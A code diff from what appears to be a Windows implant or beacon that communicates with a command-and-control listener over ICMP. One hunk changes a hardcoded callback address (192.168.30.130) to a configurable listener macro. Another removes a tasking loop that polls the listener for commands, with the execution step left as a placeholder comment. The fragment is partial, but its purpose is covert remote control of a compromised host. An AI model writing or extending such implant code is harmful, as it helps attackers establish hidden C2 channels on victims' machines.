@@ -75,7 +75,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Execute "Hello" */
 					if ( TaskHello( NULL, 0, Onb ) ) {
 						/* Change the IP to be configurable */
-						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( "192.168.30.130" ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
+						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
 					};
 				};
 			};
@@ -89,27 +89,6 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 		/* First hello sent and established */
 		if ( Ctx->Established != FALSE ) {
 			/* Start tasking loop. Finish once disconnected */
-			for ( ; Ctx->Established != FALSE ; ) {
-
-				Onb = NULL;
-				Inb = NULL;
-				Rcv = FALSE;
-
-				/* Create command request buffer */
-				if ( ( Inb = BufferCreate() ) != NULL ) {
-
-					/* Read the entire buffer */
-					if ( IcmpSendRecv( C_PTR( G_PTR( "192.168.30.130" ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
-						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
-							/* Execute task! */
-						};
-					};
-
-					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb->Buffer );
-					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
-					Inb = NULL;
-				};
-			};
 		};
 
 		/* Cleanup */
